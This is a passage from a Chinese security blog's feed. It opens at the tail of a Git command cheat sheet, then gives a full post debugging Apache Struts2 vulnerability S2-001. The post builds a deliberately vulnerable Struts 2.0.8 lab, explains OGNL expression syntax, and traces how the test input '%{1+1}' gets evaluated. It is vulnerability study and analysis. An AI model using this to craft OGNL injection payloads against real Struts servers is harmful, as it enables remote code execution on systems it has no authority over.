看你commit的日志</span><br><span class="line"></span><br><span class="line">git diff 查看尚未暂存的更新</span><br><span class="line"></span><br><span class="line">git rm a.a 移除文件(从暂存区和工作区中删除)</span><br><span class="line"></span><br><span class="line">git rm --cached a.a 移除文件(只从暂存区中删除)</span><br><span class="line"></span><br><span class="line">git commit -m &quot;remove&quot; 移除文件(从Git中删除)</span><br><span class="line"></span><br><span class="line">git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)</span><br><span class="line"></span><br><span class="line">git diff --cached 或 $ git diff --staged 查看尚未提交的更新</span><br><span class="line"></span><br><span class="line">git stash push 将文件给push到一个临时空间中</span><br><span class="line"></span><br><span class="line">git stash pop 将文件从临时空间pop下来</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git remote add origin git@github.com:username/Hello-World.git</span><br><span class="line"></span><br><span class="line">git push origin master 将本地项目给提交到服务器中</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git pull 本地与服务器端同步</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。</span><br><span class="line"></span><br><span class="line">git push origin server fix:awesome branch</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git fetch 相当于是从远程获取最新版本到本地，不会自动merge</span><br><span class="line"></span><br><span class="line">git commit -a -m &quot;log_message&quot; (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：</span><br><span class="line"></span><br><span class="line">git branch branch_0.1 master 从主分支master创建branch_0.1分支</span><br><span class="line"></span><br><span class="line">git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0</span><br><span class="line"></span><br><span class="line">git checkout branch_1.0/master 切换到branch_1.0/master分支</span><br><span class="line"></span><br><span class="line">du -hs</span><br><span class="line"></span><br><span class="line">git branch 删除远程branch</span><br><span class="line"></span><br><span class="line">git push origin:branch_remote_name</span><br><span class="line"></span><br><span class="line">git branch -r -d branch_remote_name</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">初始化版本库，并提交到远程服务器端</span><br><span class="line"></span><br><span class="line">mkdir WebApp</span><br><span class="line"></span><br><span class="line">cd WebApp</span><br><span class="line"></span><br><span class="line">git init本地初始化</span><br><span class="line"></span><br><span class="line">touch README</span><br><span class="line"></span><br><span class="line">git add README添加文件</span><br><span class="line"></span><br><span class="line">git commit -m &apos;first commit&apos;</span><br><span class="line"></span><br><span class="line">git remote add origin git@github.com:patrilic/test.git增加一个远程服务器端</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-15 09:14:11&lt;br&gt;&lt;img src=&quot;/wallpaper/62840874_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="Skills" scheme="http://patrilic.top/categories/Skills/"/>
    
    
      <category term="Git" scheme="http://patrilic.top/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>S2-001 调试日记</title>
    <link href="http://patrilic.top/2019/08/15/S2-001%20%E8%B0%83%E8%AF%95%E6%97%A5%E8%AE%B0/"/>
    <id>http://patrilic.top/2019/08/15/S2-001 调试日记/</id>
    <published>2019-08-14T18:11:50.000Z</published>
    <updated>2019-08-20T15:29:42.177Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@ Author: Patrilic<br>@ Time: 2019-8-15 02:11:50<br><img src="/wallpaper/[33861]❊-52241977.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>太菜了，马上进入大三了，最近java的中间件也陆陆续续的爆了很多洞，然后之前也经常接触类似于Weblogic反序列化、struts2命令执行之类的漏洞。借着重刷了一遍Fate Stay Night 06版，睡不着觉，干脆就来开始人生中第一个S2漏洞分析</p><h2 id="0x01-漏洞链接"><a href="#0x01-漏洞链接" class="headerlink" title="0x01 漏洞链接"></a>0x01 漏洞链接</h2><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br>影响版本：</p><blockquote><p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p></blockquote><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>struts2包下载地址：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip</a></p><p>搭建平台： MacOS Mojave 10.14.5<br>使用工具： IntelliJ IDEA<br>Tomcat版本：Apache Tomcat 8.5.16 - MxSrvs自带</p><p>首先New一个Project<br><img src="/S2-001 调试日记.resources/6FA2BAFC-BE8C-4740-B028-5642E9A3EAA8.png" alt="ddca0c177f31ccb51326857cc63de34e"></p><p>将需要的jar包放入/WEB-INF/lib目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">commons-logging-1.0.4.jar</span><br><span class="line">freemarker-2.3.8.jar</span><br><span class="line">ognl-2.6.11.jar</span><br><span class="line">struts2-core-2.0.8.jar</span><br><span class="line">xwork-2.0.3.jar</span><br></pre></td></tr></table></figure></p><p><img src="/S2-001 调试日记.resources/C8DBD68B-81B6-4C2D-BBCD-6F87BEEF1CB8.png" alt="19046de56e4a9f83e5eeee434f3ef471"></p><p>创建index.jsp文件<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>创建welcome.jsp文件<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>在src目录下创建Package <code>com.demo.action</code><br>然后创建class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>导入包<br>File-&gt;Project Structure<br><img src="/S2-001 调试日记.resources/AE8F8103-1317-4E1B-9954-D16381A8BEA7.png" alt="c2721572cd14b75b50bd62cccab3e8dd"><br><img src="/S2-001 调试日记.resources/B172D40B-5AF0-4C93-A59F-C2653B0024D9.png" alt="21aff5f519ea4ea23e7ee17e32e7dfaa"></p><p>然后设置好tomcat配置就可以Run了<br><img src="/S2-001 调试日记.resources/0D2C780D-825D-43A0-A5F6-D66B0862F51B.png" alt="c9de8ac5327705aa2b9825e2f5e0786a"></p><p><img src="/S2-001 调试日记.resources/37A62E68-1AF0-4309-87FC-DE26FBFC1A36.png" alt="e5e2c3d3929818faaf2e41f45264a79d"></p><p>如果遇到<code>java.lang.IllegalStateException: struts.properties missing</code>的问题<br>检查一下自己创建的包名或者类名是否与<code>struts.xml</code>中配置的一致</p><p>漏洞环境就已经搭好了</p><h2 id="0x03-OGNL表达式"><a href="#0x03-OGNL表达式" class="headerlink" title="0x03 OGNL表达式"></a>0x03 OGNL表达式</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><blockquote><p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言（Expression Language，简称为EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。　　　　　　　　　　　　　　　　——-百度百科</p></blockquote><p>OGNL的三要素：</p><p>　　一、表达式：</p><p>　　　　表达式（Expression）是整个OGNL的核心内容，所有的OGNL操作都是针对表达式解析后进行的。通过表达式来告诉OGNL操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL表达式支持大量的表达式，如“链式访问对象”、表达式计算、甚至还支持Lambda表达式。</p><p>　　二、Root对象：</p><p>　　　　OGNL的Root对象可以理解为OGNL的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是Root对象，这就意味着，如果有一个OGNL表达式，那么我们需要针对Root对象来进行OGNL表达式的计算并且返回结果。</p><p>　　三、上下文环境：</p><p>　　　　有个Root对象和表达式，我们就可以使用OGNL进行简单的操作了，如对Root对象的赋值与取值操作。但是，实际上在OGNL的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL的上下文环境是一个Map结构，称之为OgnlContext。Root对象也会被添加到上下文环境当中去。</p><h3 id="Ognl表达式语言的作用"><a href="#Ognl表达式语言的作用" class="headerlink" title="Ognl表达式语言的作用"></a>Ognl表达式语言的作用</h3><p>jsp页面取值用<br>EL表达式语言，也用于页面取值，是jsp页面取值的标准（默认就可以使用）<br>Ognl表达式语言，Struts标签默认支持的表达式语言，必须配置Struts标签用，不能离开Struts标签直接使用，就是说Ognl必须在Struts中使用<br>对比来看，EL使用范围更广，项目中不限制使用哪一种，哪一种熟悉就使用哪一种</p><h3 id="OGNL-的基本语法"><a href="#OGNL-的基本语法" class="headerlink" title="OGNL 的基本语法"></a>OGNL 的基本语法</h3><ol><li><p>对Root对象的访问<br>OGNL使用的是一种链式的风格进行对象的访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User(<span class="string">"rcx"</span>, <span class="string">"123"</span>);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"name"</span>, user));</span><br></pre></td></tr></table></figure></li><li><p>对上下文对象的访问<br>使用OGNL的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。当访问上下文环境当中的参数时候，需要在表达式前面加上’#’，表示了与访问Root对象的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User(<span class="string">"rcx"</span>, <span class="string">"123"</span>);</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">context.put(<span class="string">"user"</span>, user);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"#user.name"</span>, context, user));</span><br></pre></td></tr></table></figure></li><li><p>对静态变量的访问<br>在OGNL表达式当中也可以访问静态变量或者调用静态方法，格式如@[class]@[field/method()]。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object object = Ognl.getValue(<span class="string">"@com.rcx.ognl.Constant@ONE"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(object);</span><br></pre></td></tr></table></figure></li><li><p>方法的调用<br>如果需要调用Root对象或者上下文对象当中的方法也可以使用.+方法的方式来调用。甚至可以传入参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">context.put(<span class="string">"name"</span>, <span class="string">"rcx"</span>);</span><br><span class="line">context.put(<span class="string">"password"</span>, <span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"getName()"</span>, context, user));</span><br><span class="line">Ognl.getValue(<span class="string">"setName(#name)"</span>, context, user);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"getName()"</span>, context, user));</span><br></pre></td></tr></table></figure></li><li><p>对数组和集合的访问<br>OGNL支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于Map支持使用键进行访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">String[] strings  = &#123;<span class="string">"aa"</span>, <span class="string">"bb"</span>&#125;;</span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">list.add(<span class="string">"aa"</span>);</span><br><span class="line">list.add(<span class="string">"bb"</span>);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">map.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">map.put(<span class="string">"key2"</span>, <span class="string">"value2"</span>);</span><br><span class="line">context.put(<span class="string">"list"</span>, list);</span><br><span class="line">context.put(<span class="string">"strings"</span>, strings);</span><br><span class="line">context.put(<span class="string">"map"</span>, map);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#strings[0]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#list[0]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#list[0 + 1]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#map['key1']"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#map['key' + '2']"</span>, context, user));</span><br><span class="line">    &#125; ...</span><br></pre></td></tr></table></figure></li><li><p>投影与选择<br>OGNL支持类似数据库当中的选择与投影功能。<br>投影：选出集合当中的相同属性组合成一个新的集合。语法为collection.{XXX}，XXX就是集合中每个元素的公共属性。</p></li></ol><p>　　选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为collection.{Y XXX}，其中Y是一个选择操作符，XXX是选择用的逻辑表达式。</p><p>　　　　选择操作符有3种：</p><p>　　　　　　? ：选择满足条件的所有元素</p><p>　　　　　　^：选择满足条件的第一个元素</p><p>　　　　　　$：选择满足条件的最后一个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Person(<span class="number">1</span>, <span class="string">"name1"</span>);</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">ArrayList&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">list.add(p1);</span><br><span class="line">context.put(<span class="string">"list"</span>, list);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; list2 = (ArrayList&lt;Integer&gt;) Ognl.getValue(<span class="string">"#list.&#123;id&#125;"</span>,context,list);</span><br><span class="line">System.out.println(list2);</span><br></pre></td></tr></table></figure><ol start="7"><li>创建对象<br>OGNL支持直接使用表达式来创建对象。主要有三种情况：<br>构造List对象：使用{},中间使用’,’进行分割如{“aa”, “bb”, “cc”}<br>构造Map对象：使用#{}，中间使用’,进行分割键值对，键值对使用’:’区分，如#{“key1” : “value1”, “key2” : “value2”}<br>构造任意对象：直接使用已知的对象的构造方法进行构造。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = (Map&lt;String, String&gt;)Ognl.getValue(<span class="string">"#&#123;'key1':'value1'&#125;"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(map);</span><br><span class="line">List&lt;String&gt; list = (List&lt;String&gt;)Ognl.getValue(<span class="string">"&#123;'key1','value1'&#125;"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line">Object object = Ognl.getValue(<span class="string">"new java.lang.Object()"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(object);</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a>0x04 漏洞验证</h2><p><img src="/S2-001 调试日记.resources/AE253F90-888E-41D1-90B8-15C4B43015B0.png" alt="173a3723c16631be26264844cdbf62f1"></p><p><img src="/S2-001 调试日记.resources/5EEDC8F3-78F4-480C-8DEF-66D5F3A94521.png" alt="d984073fd34482b1ab9fdcbde28db701"></p><h2 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h2><p><img src="/S2-001 调试日记.resources/6C8B9E07-AF85-49FC-B9C5-C1D818490AB0.jpg" alt="7b8b8f885d3938a55ac1f182230f389b.jpeg"></p><p>Tomcat容器处理后，将http请求发送至struts2，然后分两个阶段：</p><ul><li>第一阶段： St2对请求进行预处理,这个阶段主要是St2和web容器打交道,把http请求封装成java对象.为真正的业务逻辑执行做必要的数据环境和运行环境的准备</li><li>第二阶段：XWork,执行具体的业务逻辑.</li></ul><p>首先来了解一下拦截器</p><blockquote><p>java里的拦截器是动态拦截Action调用的对象，它提供了一种机制可以使开发者在一个Action执行的前后执行一段代码，也可以在一个Action执行前阻止其执行，同时也提供了一种可以提取Action中可重用部分代码的方式。在AOP中，拦截器用于在某个方法或者字段被访问之前，进行拦截然后再之前或者之后加入某些操作。目前，我们需要掌握的主要是Spring的拦截器，Struts2的拦截器不用深究，知道即可。</p></blockquote><p><img src="/S2-001 调试日记.resources/87075291-4555-41BC-88CF-2F4F726BA71E.png" alt="48f11e0431d2c25296631c524ecb17dc"><br>在struts.xml里下一个拦截器，然后在struts_defalut.xml里能找到它拦截的class<br><img src="/S2-001 调试日记.resources/8AD9EB5A-5743-4E42-84F8-724D6D50F987.png" alt="6244e2c9092e27087d80960fd067f86c"></p><p><img src="/S2-001 调试日记.resources/1B116D26-D461-4173-B2AA-A4639BF3C65A.png" alt="11ae2cbbc91813e4be305fcd62fcd2f7"><br>第87行、把传入的参数打入到值栈中,我们在这里下断点<br><img src="/S2-001 调试日记.resources/0B9C052A-FBA3-402E-B441-377BC06BEC9E.png" alt="210a7716d4e72acc34ea0c9e4debb639"><br>继续往下，97行，带入到invocation.invoke()</p><p><img src="/S2-001 调试日记.resources/0F272921-D58B-457B-B0FE-03FE1E447BF7.png" alt="c95f5460a33e0a3cce226cb863a704fe"><br>继续跟<br><img src="/S2-001 调试日记.resources/C12A6394-C3E3-4591-8B72-DFEC418B2836.png" alt="40d89332841b0919edbc30728ba0dff4"><br>步入<code>executeResult()</code></p><p>然后步入<code>dispatcher.forward()</code></p><p><img src="/S2-001 调试日记.resources/D0D7AEDE-9400-4D4F-B636-DCF8B2E2FE9D.png" alt="4d1c0453520932caa0527b00105e2931"><br>调试到这里又到了index.jsp<br>然后就是在<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>解析标签<br><img src="/S2-001 调试日记.resources/489250AB-D028-46B8-93EE-E7652452F06B.png" alt="83ab3028a4d3ce9e570b2dd77b6c06d4"><br>然后步入<code>evaluateParams()</code><br><img src="/S2-001 调试日记.resources/B66173B9-1004-4877-B90C-52ED6488D814.png" alt="148f0c15f9f6c13af04ed5bcf3357e66"><br>继续执行到altSyntax(),这个方法返回true,根据<a href="https://cwiki.apache.org/confluence/display/WW/Alt+Syntax" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/Alt+Syntax</a><br>,altSyntax默认开启,为了动态的改变标签属性的值,它允许执行标签属性中的OGNL表达式.</p><p>同时,为了不过多的引入单引号,可以使用”%{…}”的形式来写入表达式.</p><p>此后o为%{1+1}，再对o进行了一番处理后，payload经过result变量，最终成为expression的值：<br><img src="/S2-001 调试日记.resources/38069271-2D08-4E46-AF70-5D74F1CA6BF2.png" alt="f079a36c37e194f8835ce649747acfae"></p><p><img src="/S2-001 调试日记.resources/1EF4E0C0-D0AD-47E9-B2D6-28F1583690EB.png" alt="2e1134a2480a0576252c8bffc59beea3"><br><img src="/S2-001 调试日记.resources/96B54A5E-7312-40B9-A2D6-0DEF9D868B6E.png" alt="29bb80f0510fa9b3c240536a175a3c7b"><br>最后<code>Object o = stack.findValue(var, asType);</code>执行payload<br><img src="/S2-001 调试日记.resources/F61303FA-6893-40A5-A62B-492EC506AE7C.png" alt="69e61401ac66f42f5b7f17f42870d541"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>其实这个漏洞还是挺简单的，写的很乱，但是确实是跟着几篇文章一步一步自己跳出来的，也算是第一个调的java漏洞了，学到很多调试技巧，膜一下chybeta师傅..</p><h2 id="0x07-链接"><a href="#0x07-链接" class="headerlink" title="0x07 链接"></a>0x07 链接</h2><p><a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8</a></p><p><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@ Author: Patrilic&lt;br&gt;@ Time: 2019-8-15 02:11:50&lt;br&gt;&lt;img src=&quot;/wallpaper/[33861]❊-52241977.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 i
      
    
    </summary>
    
